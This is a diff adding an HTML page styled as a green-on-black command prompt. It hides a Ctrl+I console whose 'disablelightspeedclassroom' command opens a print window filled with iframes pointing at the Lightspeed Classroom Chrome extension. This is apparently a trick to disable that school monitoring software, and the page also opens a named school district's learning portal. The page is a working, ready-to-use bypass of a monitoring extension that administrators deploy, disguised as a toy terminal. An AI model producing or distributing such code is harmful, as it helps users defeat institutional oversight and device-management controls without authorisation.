@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CMD Prompt</title>
+    <style>
+        body {
+            background-color: black;
+            color: green;
+            font-family: monospace;
+        }
+
+        #cmd-box {
+            opacity: 0;
+            visibility: hidden;
+            position: fixed;
+            top: 20%;
+            left: 50%;
+            transform: translate(-50%, -20%);
+            width: 400px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid green;
+            padding: 10px;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+            box-shadow: 0 0 15px green;
+            border-radius: 5px;
+        }
+
+        .visible {
+            display: block;
+            opacity: 1;
+        }
+
+        #history {
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        input {
+            width: 100%;
+            background: black;
+            color: green;
+            border: none;
+            outline: none;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div id="cmd-box">
+        <div id="history"></div>
+        <p>C:\User></p>
+        <input type="text" id="cmd-input" autofocus>
+    </div>
+
+    <script>
+        // Add the extensions and icons definitions here
+        const extensions = {
+            "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+        };
+
+        const icons = {
+            "Lightspeed Classroom": "data:image/png;base64,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",
+        };
+
+        document.addEventListener("keydown", function (event) {
+            if (event.ctrlKey && event.key === "i") {
+                event.preventDefault();
+                let cmdBox = document.getElementById("cmd-box");
+                cmdBox.style.visibility = "visible";
+                cmdBox.style.opacity = "1";
+                document.getElementById("cmd-input").focus();
+            }
+        });
+
+        document.getElementById("cmd-input").addEventListener("keydown", function (event) {
+            if (event.key === "Enter") {
+                let command = this.value.trim().toLowerCase();
+                let history = document.getElementById("history");
+                let output = "";
+
+                if (command === "time") {
+                    output = new Date().toLocaleTimeString();
+                } else if (command === "clear") {
+                    history.innerHTML = "";
+                    this.value = "";
+                    return;
+                } else if (command === "disablelightspeedclassroom") {
+                    output = "Disabling Lightspeed Classroom...";
+                    disableLightspeedClassroom();
+                } else {
+                    output = "Command not recognized";
+                }
+
+                let newEntry = document.createElement("p");
+                newEntry.textContent = `C:\\User> ${command}`;
+                history.appendChild(newEntry);
+
+                if (output) {
+                    let response = document.createElement("p");
+                    response.textContent = output;
+                    history.appendChild(response);
+                }
+
+                history.scrollTop = history.scrollHeight;
+                this.value = "";
+            }
+        });
+
+        function disableLightspeedClassroom() {
+            const extName = "Lightspeed Classroom";
+            const extPage = extensions[extName]; // Fetch the URL from the extensions object
+            const extIcon = icons[extName]; // Fetch the icon from the icons object
+            const extId = "kkbmdgjggcdajckdlbngdjonpchpaiea"; // Extension ID
+
+            // Automatically disable the extension without a popup
+            createIframesAndPrint(extPage, extIcon);
+
+            // Add a message to the command history
+            let history = document.getElementById("history");
+            let response = document.createElement("p");
+            response.textContent = "Lightspeed Classroom has been killed!";
+            history.appendChild(response);
+            history.scrollTop = history.scrollHeight;
+        }
+
+        function createIframesAndPrint(extPage, extIcon) {
+            let printerWindow = window.open("", "_blank");
+            let fullscreenWindow = window.open("https://lms.fcps.edu/home", "_blank", `width=${screen.width},height=${screen.height},top=0,left=0`);
+            fullscreenWindow.moveTo(0, 0);
+            fullscreenWindow.resizeTo(screen.width, screen.height);
+            printerWindow.document.title = 'Disable';
+            printerWindow.document.body.style.backgroundColor = '#1e1f22';
+
+            let icon = printerWindow.document.createElement('link');
+            icon.rel = 'icon';
+            icon.href = extIcon;
+            icon.type = 'image/x-icon';
+            printerWindow.document.head.appendChild(icon);
+
+            let printerBody = printerWindow.document.body;
+
+            let loadingContainer = printerWindow.document.createElement("div");
+            loadingContainer.style.position = "fixed";
+            loadingContainer.style.top = "50%";
+            loadingContainer.style.left = "50%";
+            loadingContainer.style.transform = "translate(-50%, -50%)";
+            loadingContainer.style.color = "white";
+            loadingContainer.style.fontSize = "20px";
+            loadingContainer.style.fontFamily = "'Roboto', sans-serif";
+            loadingContainer.style.textAlign = "center";
+
+            let spinner = printerWindow.document.createElement("div");
+            spinner.style.border = "4px solid rgba(255, 255, 255, 0.3)";
+            spinner.style.borderTop = "4px solid white";
+            spinner.style.borderRadius = "50%";
+            spinner.style.width = "40px";
+            spinner.style.height = "40px";
+            spinner.style.animation = "spin 1s linear infinite";
+            spinner.style.margin = "0 auto 10px";
+
+            let loadingText = printerWindow.document.createElement("div");
+            loadingText.innerText = "Loading...";
+
+            loadingContainer.appendChild(spinner);
+            loadingContainer.appendChild(loadingText);
+            printerBody.appendChild(loadingContainer);
+
+            let style = printerWindow.document.createElement("style");
+            style.innerHTML = `
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                `;
+            printerWindow.document.head.appendChild(style);
+
+            let script = printerWindow.document.createElement("script");
+            script.innerHTML = `
+                    setTimeout(() => {
+                        window.close();
+                    }, 5000);
+                `;
+            printerWindow.document.body.appendChild(script);
+
+            setTimeout(() => {
+                for (let i = 0; i < 5; i++) { // Adjust the number of iframes as needed
+                    const iframe = document.createElement('iframe');
+                    iframe.src = extPage;
+                    iframe.width = "25px";
+                    iframe.height = "25px";
+                    iframe.style.border = "none";
+                    printerBody.appendChild(iframe);
+                }
+
+                loadingContainer.remove();
+                printerWindow.print();
+                let iframes = printerWindow.document.querySelectorAll("iframe");
+                iframes.forEach(iframe => iframe.remove());
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
